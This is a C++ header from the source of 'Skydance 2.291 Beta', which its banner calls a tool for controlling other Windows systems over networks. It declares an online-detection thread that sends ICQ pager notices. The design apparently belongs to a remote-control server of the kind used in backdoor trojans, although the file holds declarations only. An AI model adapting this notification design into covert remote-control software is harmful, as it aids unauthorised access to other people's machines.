/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
#if !defined(AFX_ONLINETHREAD_H__56394800_38CE_11D4_A059_00C026A21151__INCLUDED_)
#define AFX_ONLINETHREAD_H__56394800_38CE_11D4_A059_00C026A21151__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// OnlineThread.h : Header-Datei
//

/////////////////////////////////////////////////////////////////////////////
// Thread COnlineThread 

class COnlineThread : public CWinThread
{
	DECLARE_DYNCREATE(COnlineThread)
protected:
	COnlineThread();           // Dynamische Erstellung verwendet geschützten Konstruktor

// Attribute
public:

// Operationen
public:
	CString m_sServerInfo;
	CString m_sUIN;
	BOOL m_biConnected;
	void SocketThreadInit();
	void SendICQPager(CString UIN);
	void DetectOnlineFunc();
// Überschreibungen
	// Vom Klassen-Assistenten generierte virtuelle Funktionsüberschreibungen
	//{{AFX_VIRTUAL(COnlineThread)
	public:
	virtual BOOL InitInstance();
	virtual int ExitInstance();
	//}}AFX_VIRTUAL

// Implementierung
protected:
	virtual ~COnlineThread();

	// Generierte Nachrichtenzuordnungsfunktionen
	//{{AFX_MSG(COnlineThread)
		// HINWEIS - Der Klassen-Assistent fügt hier Member-Funktionen ein und entfernt diese.
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ fügt unmittelbar vor der vorhergehenden Zeile zusätzliche Deklarationen ein.

#endif // AFX_ONLINETHREAD_H__56394800_38CE_11D4_A059_00C026A21151__INCLUDED_
